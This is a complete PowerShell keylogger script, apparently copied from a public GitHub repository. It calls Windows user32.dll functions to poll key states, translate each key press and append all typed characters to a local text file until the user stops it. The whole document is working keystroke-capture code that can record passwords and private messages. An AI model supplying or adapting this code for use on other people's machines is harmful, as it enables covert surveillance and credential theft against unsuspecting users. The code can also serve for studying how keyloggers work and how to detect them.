#https://github.com/lazywinadmin/PowerShell/blob/master/TOOL-Start-KeyLogger/Start-KeyLogger.ps1
#by Francois-Xavier Cat

function Start-KeyLogger
{
     param
     (
         [string]
         $Path = "c:\temp\keylogger.txt"
     )

  # Signatures for API Calls
  $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

  # load signatures and make members available:
  $API = Add-Type -MemberDefinition $signatures -name 'Win32' -namespace API -passThru

  # create output file:
  $null = New-Item -Path $Path -ItemType File -Force

  try
  {
      Write-Host 'Recording Keypresses. Press CTRL+C to see results.' -ForegroundColor Red

      # create endless loop. When user presses CTRL+C, finally-bock
      # executes and shows the collected key presses:
      while ($true)
      {
          Start-Sleep -Milliseconds 40

          # scan all ascii codes above 8:
          for ($ascii = 9; $ascii -le 254; $ascii++)
          {
              # get current key state:
              $state = $API::GetAsyncKeyState($ascii)

              # is key pressed?
              if ($state -eq -32767) {
                  $null = [console]::CapsLock

                  # translate scan code to real code:
                  $virtualKey = $API::MapVirtualKey($ascii, 3)

                  # get keyboard state for virtual keys:
                  $kbstate = New-Object Byte[] 256
                  $checkkbstate = $API::GetKeyboardState($kbstate)

                  # prepare stringbuilder to receive input key:
                  $mychar = New-Object -TypeName System.Text.StringBuilder

                  # translate virtual key:
                  $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

                  if ($success)
                  {
                      # add key to logger file:
                      [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
                  }
              }
          }
      }
  }
  finally
  {
      # open logger file in notepad:
      notepad $Path
  }
}

# records all key presses until script is aborted by pressing CTRL+C
# will then open the file with collected key codes:
Start-KeyLogger